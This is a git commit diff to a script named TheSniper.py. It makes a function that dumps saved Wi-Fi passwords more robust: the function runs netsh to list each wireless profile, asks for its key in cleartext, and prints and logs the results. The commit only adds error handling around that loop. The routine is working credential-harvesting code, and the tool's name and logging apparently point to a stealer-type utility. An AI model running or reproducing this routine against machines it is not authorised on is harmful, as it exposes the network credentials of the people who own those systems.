4b9a068b55e0539ed90b1d2dd2e4b94a7a717be0
Karthik Raja K <2001.3.12kaarthik@gmail.com>
2022-09-21 01:04:06 +0530

    Fixed crashing issue

--- TheSniper.py
+++ TheSniper.py
@@ -114,10 +114,13 @@ def passwords():
     data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
     profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
     for i in profiles:
-        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
-        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
-        print(f"{i}:----->{results}")
-        logging.info(str(f"{i}------>{results}"))
+        try:
+            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
+            results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
+            print(f"{i}:----->{results}")
+            logging.info(str(f"{i}------>{results}"))
+        except:
+            pass
 
 
 def main():
